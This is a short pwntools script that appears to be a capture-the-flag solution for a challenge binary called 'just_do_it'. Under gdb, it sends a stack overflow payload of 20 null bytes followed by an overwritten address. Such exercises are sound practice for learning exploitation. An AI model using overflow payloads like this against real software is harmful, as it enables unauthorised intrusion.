#!/usr/bin/python3

from pwn import *

payload = b"\x00"*20
payload += p32(0x804a080)

target = gdb.debug('./just_do_it','''
b *0x080486dd
''')

print(target.readline())
print(target.readline())
target.sendline(payload)
print(target.readline())
